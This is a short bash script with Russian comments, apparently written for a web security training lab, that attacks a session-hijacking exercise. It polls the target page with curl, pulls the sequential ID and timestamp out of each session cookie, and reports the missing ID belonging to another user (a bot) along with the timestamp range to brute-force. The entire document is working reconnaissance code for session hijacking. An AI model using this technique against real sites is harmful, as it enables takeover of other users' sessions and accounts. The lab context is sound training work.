#!/bin/bash
echo "[*] Ищем пропуск в ID сессий..."
prev_id=0

for i in {1..20}; do
  # Получаем куку
  res=$(curl -s -I "http://web0x01.hbtn/a1/hijack_session/" | grep -i "set-cookie")
  val=$(echo $res | awk -F'=' '{print $2}' | awk -F';' '{print $1}')
  
  # Парсим ID и TS
  id=$(echo $val | cut -d'-' -f5)
  ts=$(echo $val | cut -d'-' -f6)
  
  if [ $prev_id -ne 0 ]; then
    diff=$((id - prev_id))
    if [ $diff -gt 1 ]; then
      missing_id=$((prev_id + 1))
      echo -e "\n[!!!] НАШЛИ ПРОПУСК!"
      echo "Твой прошлый ID: $prev_id (TS: $prev_ts)"
      echo "Твой текущий ID: $id (TS: $ts)"
      echo "ЦЕЛЕВОЙ ID (Бота): $missing_id"
      echo "Диапазон таймстампа для брута: $prev_ts - $ts"
      exit 0
    fi
  fi
  
  prev_id=$id
  prev_ts=$ts
  echo -n "."
  sleep 0.2
done
echo -e "\n[-] Пропусков не найдено. Попробуй запустить еще раз."
